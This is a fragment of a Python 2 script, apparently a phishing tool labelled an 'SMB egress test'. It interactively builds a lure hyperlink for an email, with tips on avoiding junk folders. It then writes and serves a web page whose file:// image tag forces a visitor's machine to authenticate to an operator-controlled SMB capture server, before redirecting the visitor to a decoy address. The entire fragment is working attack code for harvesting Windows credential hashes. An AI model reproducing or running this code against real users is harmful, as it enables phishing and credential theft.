	#HYPER LINK OPTIONS
	print('TIP: A HyperLink can be directed to an Webpage with an HTML IMG Tag.')
	hyperLinkOption = raw_input('Would you like to add a HyperLink to your message?[yes]: ') or 'yes'
	print('ENTERED:' "%s" % hyperLinkOption + "\n")
	choice = hyperLinkOption.lower()
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	if choice in yes:
		print('TIP: Domain based HyperLinks help avoid the "JunkFolder".')
		hyperAddress = raw_input('Please enter a addresss without "http://": ['+extipAddress+']:' ) or extipAddress
		print("ENTERED: " "%s" % "http://"+hyperAddress+"/" + "\n")
		hyperText = raw_input('Enter text for Hyperlink to be displayed[CLICK ME!]: ') or 'CLICK ME!'
		print("ENTERED: " "%s" % hyperText + "\n")
		hyperLink = '<a href="http://'+hyperAddress+'/" target="_blank">'+hyperText+'</a>' 
		#HTTP Server OPTIONS
		print('TIP: You can point your HyperLink to a locally hosted Webpage.')
		httpServOption = raw_input("Host local Webpage with an HTML IMG Tag?[yes]: ") or 'yes'
		print('ENTERED:' "%s" % httpServOption + "\n")
		choice = httpServOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		if choice in yes:
			httpPort = raw_input("HTTP Server Port?:[80]") or 80
			print('ENTERED:' "%s" % httpPort + "\n")
			print("\n")
			print("TIP: Coming soon...")
			#Redirect OPTIONS
			redirectOption = raw_input("Would you like a redirect on your Webpage?[yes]:") or 'yes'
			print('ENTERED:' "%s" % redirectOption + "\n")
			choice = redirectOption.lower()
			yes = set(['yes','y', 'ye', ''])
			no = set(['no','n'])
			if choice in yes:
				redirect = raw_input('Enter redirect address[ex: client-site.com]:') or ''
				print('ENTERED:' "%s" % redirect + "\n")
			elif choice in no:
				print('Okay, Webpage will not redirect:')
				redirect = ''
			else:
				sys.stdout.write("Please respond with 'yes' or 'no'")
		### EDIT: HTML Template Below ###
		### Becareful not to remove the variables {0} and {1} ###
			html = """
			<!DOCTYPE HTML>
			<html lang="en-US">
	    		<head>
	        		<meta charset="UTF-8">
	        		<meta http-equiv="refresh" content="1;url={1}">
	        		<script type="text/javascript">
	            		window.location.href = "{1}"
	        		</script>
	        <title>SMB Egress Test Page.</title>
	    	</head>
			<br>
			<img src=file://{0}/image/foo.gif>
			</body>
			</html>
			"""
			indexHTML = html.format(smbCaptureServer, redirect)
			print(indexHTML)
			print("\n")
			with open('index.html','w+') as f1:
				f1.write(indexHTML)
			print('Starting HTTP Server')
			print('\n...')
			httpPort = 80
			Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
			httpd = SocketServer.TCPServer(("",httpPort), Handler)
			server_process = multiprocessing.Process(target=httpd.serve_forever)
			server_process.daemon = True
			server_process.start()
			print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
			print("\n")
		elif choice in no:
			print('Ok local HTTP Server not started: \n')
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")